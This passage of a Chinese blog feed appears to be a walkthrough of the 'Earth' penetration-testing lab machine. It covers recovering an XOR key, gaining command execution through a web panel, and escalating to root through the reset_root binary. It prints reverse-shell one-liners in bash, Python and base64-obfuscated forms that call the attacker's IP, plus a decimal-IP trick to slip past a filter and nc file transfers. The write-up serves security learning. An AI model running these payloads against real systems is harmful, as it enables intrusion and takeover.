class=\"token punctuation\">(</span>ciphertext_hex<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 将十六进制字符串转换为字节串</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> char_plain<span class=\"token punctuation\">,</span> char_cipher <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> ciphertext_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        key_byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char_plain<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> char_cipher  <span class=\"token comment\"># 对应位置的字符进行异或运算</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        key<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>key_byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>plaintext <span class=\"token operator\">=</span> <span class=\"token string\">\"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ciphertext_hex <span class=\"token operator\">=</span> <span class=\"token string\">\"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a\"</span>  <span class=\"token comment\"># 这里密文是十六进制表示的字符串</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>key <span class=\"token operator\">=</span> find_key<span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> ciphertext_hex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># OUTPUT：</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token string\">b'earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat'</span></pre></td></tr></table></figure><p><code>earthclimatechangebad4humans</code>  重复了 15 次。用明文和其他两串密文尝试了下，key 都是含有字符杂乱无章的乱码（没有不可见字符）。然后用 <code>earthclimatechangebad4humans</code>  作为密钥尝试解密另外两串密文，得到的也还是杂乱的字符串（含有不可见字符），看不出来有什么特殊意义。</p>\n<h1 id=\"白送了一个webshell\"><a class=\"anchor\" href=\"#白送了一个webshell\">#</a> 白送了一个 webshell</h1>\n<p>不过提示中给了用户名，尝试登录一下。用户名： <code>terra </code> ，密码： <code>earthclimatechangebad4humans</code></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504011702039.png\" alt=\"image-20240504011702039\" /></p>\n<p>这里可以运行 CGI 脚本，了解一下什么是 CGI 先。</p>\n<blockquote>\n<p>CGI 是一种标准的、平台无关的、协议无关的接口，用于将 Web 服务器与 Web 应用程序或脚本连接起来。CGI 允许 Web 服务器调用外部程序来处理客户端请求，并将输出返回给客户端。</p>\n</blockquote>\n<p>说人话：服务器一个脚本，获取数据处理后返回结果给浏览器。</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>数据从哪来？ENV 环境变量，或者标准输入（STDIN）；</p>\n</li>\n<li class=\"lvl-2\">\n<p>脚本用什么语言？可以是 Python 脚本，PERL 脚本，SHELL 脚本，C 或者 C++ 程序等。</p>\n</li>\n<li class=\"lvl-2\">\n<p>结果怎么返回？输出数据发送到标准输出（STDOUT）。</p>\n</li>\n</ul>\n<p><mark><strong>特别之处：</strong></mark></p>\n<ol>\n<li class=\"lvl-3\">\n<p>数据输入</p>\n</li>\n</ol>\n<p>** 环境变量读取：** 对于 CGI 程序来说，它继承了系统的环境变量。CGI 环境变量在 CGI 程序启动时初始化，在结束时销毁。当一个 CGI 程序不是被 HTTP 服务器调用时，它的环境变量几乎是系统环境变量的复制。当这个 CGI 程序被 HTTP 服务器调用时，它的环境变量就会多了以下关于 HTTP 服务器、客户端、CGI 传输过程等项目。</p>\n<p>** 浏览器数据发送：** 获取的是浏览器 url 编码后的原始数据，若要使用则需要 CGI 手动解码调用。</p>\n<ol start=\"2\">\n<li class=\"lvl-3\">\n<p>数据输出</p>\n</li>\n</ol>\n<p>CGI 程序如何将信息处理结果返回给客户端？这实际上是 CGI 格式化输出。</p>\n<p>在 CGI 程序中的标准输出 stdout 是经过重定义了的，它并没有在服务器上产生任何的输出内容，而是被重定向到客户浏览器，这与它是由 C，还是 Perl 或 Python 实现无关。</p>\n<p>CGI 协议还有一系列规范，详解戳👉知识传送门：<a href=\"https://blog.csdn.net/weixin_39609623/article/details/86312439\">WEB 之 CGI----CGI 详解_cgi web-CSDN 博客</a></p>\n<p>看完这些应该都能发现这是<span class=\"spoiler\" title=\"你知道得太多了\"> hacker 的最爱</span>了。这个框框直接可以命令执行。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504015919921.png\" alt=\"image-20240504015919921\" /></p>\n<p>直接弹个 shell 到 kali 上，准备后续的提权。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/192.168.81.129/9999 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span>    <span class=\"token comment\">#  CGI 靶机执行弹 shell</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvvp</span> <span class=\"token number\">9999</span>                                   <span class=\"token comment\"># kali 监听端口</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504020245279.png\" alt=\"image-20240504020245279\" /></p>\n<p>我嘞个豆，Forbidden 了……（心理怒喷一万句但是表面怂得一批）。直接弹不行绕一下。</p>\n<p>反弹 shell payload 大全：<a href=\"https://www.revshells.com/\">Online - Reverse Shell Generator (revshells.com)</a></p>\n<p>硬的不行来软的，用脚本弹。前面已经知道了靶机有 python 环境的。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python3 <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.81.129\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'</span></pre></td></tr></table></figure><p><span class=\"spoiler\" title=\"你知道得太多了\">淦</span>这里还有个限制，如果是用 hackbar 在 POST 中输入 command，由于网页存在 csrf 的 token 校验，导致 execute 时直接弹出 403Forbidden，而直接在输入框中输入发现有长度 100 的限制。于是也行不通。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> exec<span class=\"token punctuation\">(</span><span class=\"token string\">'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjgxLjEyOS85OTk5IDA+JjE='</span>.decode<span class=\"token punctuation\">(</span><span class=\"token string\">'base64'</span><span class=\"token punctuation\">))</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-c</span> <span class=\"token punctuation\">&#123;</span>echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC44MS4xMjkvOTk5OSAwPiYx<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>base64,-d<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>bash,-i<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这两个 payload 都正常执行了但是却没有弹 shell 到 kali 上，我猜测这里的 waf 只是正则匹配了 ip 的格式，试一下用进制绕过：</p>\n<p>3232256385 ---&gt; 192.168.81.129 的 10 进制。<a href=\"https://www.metools.info/other/ipconvert162.html\">IP 地址十六进制、二进制、十进制转换在线工具</a></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/3232256385/9999 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></table></figure><p>弹是弹到了但是……<span class=\"spoiler\" title=\"你知道得太多了\"> 作者我星星你个 **😠</span></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505130316045.png\" alt=\"image-20240505130316045\" /></p>\n<p>应该是 sudo 的问题，没有管理员权限没有填写密码导致 CGI 进程被关闭。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/3232256385/9999 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505135912477.png\" alt=\"image-20240505135912477\" /></p>\n<p>一般反弹的 webshell 都是老弱病残，不支持上下文并且无法运行交互式命令。已知靶机有 python 环境，试一试能不能打开交互式 shell，然后尝试下提权。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p>打开后还是这个终端，并且可以交互。为什么 webshell 直接就是交互式 shell？大概和 CGI 的输入输出流有关系吧（只是猜测）。</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505150248362.png\" alt=\"image-20240505150248362\" /></p>\n<p>查看 <code>/etc/passwd</code> ，当前用户是 apache。</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root:x:0:0:root:/root:/bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bin:x:1:1:bin:/bin:/sbin/nologin</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>daemon:x:2:2:daemon:/sbin:/sbin/nologin</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>adm:x:3:4:adm:/var/adm:/sbin/nologin</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sync:x:5:0:sync:/sbin:/bin/sync</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>halt:x:7:0:halt:/sbin:/sbin/halt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>operator:x:11:0:operator:/root:/sbin/nologin</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>games:x:12:100:games:/usr/games:/sbin/nologin</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>systemd-oom:x:998:996:systemd Userspace OOM Killer:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>systemd-timesync:x:997:995:systemd Time Synchronization:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>dbus:x:81:81:System message bus:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>polkitd:x:996:994:User for polkitd:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>cockpit-ws:x:995:991:User for cockpit web service:/nonexisting:/sbin/nologin</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>cockpit-wsinstance:x:994:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>abrt:x:173:173::/etc/abrt:/sbin/nologin</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>setroubleshoot:x:993:989::/var/lib/setroubleshoot:/sbin/nologin</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>dnsmasq:x:992:988:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>chrony:x:991:987::/var/lib/chrony:/sbin/nologin</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>tcpdump:x:72:72::/:/sbin/nologin</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>systemd-network:x:985:985:systemd Network Management:/:/usr/sbin/nologin</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>unbound:x:984:984:Unbound DNS resolver:/etc/unbound:/sbin/nologin</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>clevis:x:983:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>earth:x:1000:1000::/home/earth:/bin/bash</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</pre></td></tr></table></figure><p>试下找找 flag：</p>\n<p><code>find / -name 'flag*'</code>      ----&gt; 空</p>\n<p><code>find / -name 'fla*' </code>        ----&gt; 空</p>\n<h1 id=\"get-earth-shell\"><a class=\"anchor\" href=\"#get-earth-shell\">#</a> Get-Earth-Shell</h1>\n<p>没找到 flag 就提提权吧</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>注意第15行</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bash-5.1$ <span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/usr/bin/chage</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/usr/bin/gpasswd</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>/usr/bin/newgrp</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>/usr/bin/su</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>/usr/bin/mount</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>/usr/bin/umount</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>/usr/bin/pkexec</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>/usr/bin/passwd</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/usr/bin/chfn</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>/usr/bin/chsh</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>/usr/bin/at</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>/usr/bin/sudo</pre></td></tr><tr class=\"marked\"><td data-num=\"15\"></td><td><pre>/usr/bin/reset_root</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>/usr/sbin/grub2-set-bootflag</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>/usr/sbin/pam_timestamp_check</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>/usr/sbin/unix_chkpwd</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>/usr/sbin/mount.nfs</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>/usr/lib/polkit-1/polkit-agent-helper-1</pre></td></tr></table></figure><details class=\"info\"><summary>遇到了很多没见过了命令，我都去了解了下：</summary><div>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><code>chage</code> （change user age information）用于更改用户的账户过期信息。这些信息包括账户的过期日期、密码的最近和最旧更改时间、密码的警告期、密码的宽限期和账户的休眠期。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>gpasswd</code>  用来管理组，它可以用于添加或删除组中的用户、更改组的密码或更改组的特性。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>newgrp</code>  用于改变当前用户的登录组，即临时改变用户的默认组。用户需要知道该组的密码，并且只能切换到他们属于的组。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>mount</code>  命令用于将文件系统挂载到 Linux 系统的目录结构中。挂载后，用户和程序就可以访问文件系统中的文件。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>umount</code>  用于卸载已经挂载的文件系统。卸载后，文件系统中的文件将不再可访问。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>pkexec</code>  是 PolicyKit 的一部分，它允许非特权用户以管理员权限执行命令。 <code>pkexec</code>  会提示用户输入其密码，然后以 root 用户的权限运行指定的命令。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>chsh </code> 用来更换登录系统时使用的 shell。 <code>-l</code>  查看 <code>/etc/shells</code> ， <code>-s</code>  修改当前用户的 shell（实际上就是修改 <code>/etc/shells</code> ），修改后需要重启。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>at [选项] 时间</code> ，用于安排在指定时间执行后台任务。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>su</code>  和 <code>sudo</code>  都知道。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>reset_root</code>  用于重置 root 用户的密码。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>grub2-set-bootflag</code>  用于设置 grub2 引导标志。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>unix_chkpwd</code>  用于检查用户密码是否符合系统密码策略。由系统自动调用，用户无需手动执行。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>mount.nfs [选项] &lt;服务器地址&gt;:&lt;远程路径&gt; &lt;本地路径&gt;</code>  用于挂载 NFS 文件系统。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>polkit-agent-helper-1</code>  是 Polkit（PolicyKit）框架的一部分，用于向用户显示权限请求对话框并执行权限操作。由系统自动调用。</p>\n</li>\n</ul>\n</div></details>\n<p>看到 reset_root 我以为有搞头，但是……</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505151019452.png\" alt=\"image-20240505151019452\" /></p>\n<p><strong>检查是否存在重置触发器...<br />\n 重置失败，所有触发器都不存在。</strong></p>\n<p>在这里卡了几个小时，再求助一下 wp 吧。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nlvp</span> <span class=\"token number\">9998</span> <span class=\"token operator\">></span>reset_root     <span class=\"token comment\"># kali 执行，监听端口 9998，结果写入文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span>  <span class=\"token number\">192.168</span>.81.129 <span class=\"token number\">9998</span> <span class=\"token operator\">&lt;</span> /usr/bin/reset_root   <span class=\"token comment\">#  借助 nc 将 reset_root 文件发到 kali 上</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token function\">chmod</span> +x reset_root   <span class=\"token comment\">#  使用之前需要将 reset_root 赋于执行权限，</span></pre></td></tr></table></figure><p>然后本地用<strong> strace</strong> 命令调试，原谅我知识浅薄，又学了下什么是 strace。</p>\n<details class=\"primary\"><summary>调试工具strace</summary><div>\n<p><code>strace</code>  是一个用于跟踪和记录进程系统调用以及信号的工具。它能够监视进程执行期间发生的系统调用，并将这些调用以及它们的参数和返回值输出到标准输出或指定的文件中。 <code>strace</code>  常用于调试程序、分析进程的行为、查找性能问题等。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">strace</span>     <span class=\"token comment\">#  安装 strace 调试工具</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">strace</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">]</span>   <span class=\"token comment\">#  命令格式  command 是被调试的命令</span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th>选项</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-d</code>  或  <code>--debug</code></td>\n<td>打印  <code>strace</code>  内部调试信息。</td>\n</tr>\n<tr>\n<td><code>-f</code>  或  <code>--follow</code></td>\n<td>跟踪子进程。当结合  <code>-p</code>  使用时，跟踪特定进程的子孙。</td>\n</tr>\n<tr>\n<td><code>-ff</code></td>\n<td><code>-f</code>  的持久版本，用于跟踪由 PID 文件指定的 PID。</td>\n</tr>\n<tr>\n<td><code>-F</code></td>\n<td>打印文件描述符，而不是命令名称。</td>\n</tr>\n<tr>\n<td><code>-i</code>  或  <code>--trace=all</code></td>\n<td>跟踪所有系统调用。</td>\n</tr>\n<tr>\n<td><code>-p PID</code>  或  <code>--pid=PID</code></td>\n<td>跟踪指定的进程 ID。</td>\n</tr>\n<tr>\n<td><code>-s STRLEN</code></td>\n<td>设置输出中每个行的字符串打印的最大长度。</td>\n</tr>\n<tr>\n<td><code>-t</code>  或  <code>--time</code></td>\n<td>在每行输出前加上时间戳。</td>\n</tr>\n<tr>\n<td><code>-tt</code></td>\n<td>打印纳秒级的时间戳。</td>\n</tr>\n<tr>\n<td><code>-T</code></td>\n<td>显示每个系统调用的时间开销。</td>\n</tr>\n<tr>\n<td><code>-v</code>  或  <code>--verbose</code></td>\n<td>显示系统调用的详细信息。</td>\n</tr>\n<tr>\n<td><code>-e TRACEEVENT</code></td>\n<td>跟踪特定的系统调用或信号。例如， <code>-e open</code>  将只跟踪  <code>open</code>  调用。</td>\n</tr>\n</tbody>\n</table>\n<p><code>-e</code>  参数可以接受以下几种类型的类别作为参数：</p>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><code>trace</code> ：系统调用。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>signal</code> ：信号。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>process</code> ：进程事件。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exec</code> ：exec 事件。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>read</code> 、 <code>write</code> 、 <code>socket</code>  等：特定类型的系统调用。</p>\n</li>\n</ul>\n<p>Come from 🤖GPT</p>\n</div></details>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505184945177.png\" alt=\"image-20240505184945177\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>Problems</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/shm/kHgTFI5G\"</span>, F_OK<span class=\"token punctuation\">)</span>       <span class=\"token operator\">=</span> <span class=\"token parameter variable\">-1</span> ENOENT <span class=\"token punctuation\">(</span>没有那个文件或目录<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/shm/Zw7bV9U5\"</span>, F_OK<span class=\"token punctuation\">)</span>       <span class=\"token operator\">=</span> <span class=\"token parameter variable\">-1</span> ENOENT <span class=\"token punctuation\">(</span>没有那个文件或目录<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/kcM0Wewe\"</span>, F_OK<span class=\"token punctuation\">)</span>           <span class=\"token operator\">=</span> <span class=\"token parameter variable\">-1</span> ENOENT <span class=\"token punctuation\">(</span>没有那个文件或目录<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>问题就在这里了，然后就是非常简单粗暴的 —— 创建这三个文件。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">touch</span>  /dev/shm/kHgTFI5G</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">touch</span> /dev/shm/Zw7bV9U5</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">touch</span> /tmp/kcM0Wewe</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505185404951.png\" alt=\"image-20240505185404951\" /></p>\n<p>在靶机上登录成功！！！</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505185531193.png\" alt=\"image-20240505185531193\" /></p>\n<p>原来 flag 前后都字符啊……（长叹一口气）。最后也是找到了两个🚩🚩flag</p>\n<p><code>/root/root_flag.txt</code>  &amp;  <code>/var/earth_web/user_flag.txt</code></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505190233308.png\" alt=\"image-20240505190233308\" /></p>\n<h1 id=\"finally\"><a class=\"anchor\" href=\"#finally\">#</a> Finally</h1>\n<p>每个网安人的必修课大概就是：</p>\n<p><strong>With Great Power Comes Great Responsibilities</strong></p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/05/05/A8yelkGqMTRvP6a.jpg\" alt=\"With Great Power Comes Great Responsibilities\" /></p>\n",
            "tags": [
                "Penetration Test",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/",
            "url": "https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/",
            "title": "MSF---万千waf中取ROOT首级",
            "date_published": "2024-05-04T13:59:11.000Z",
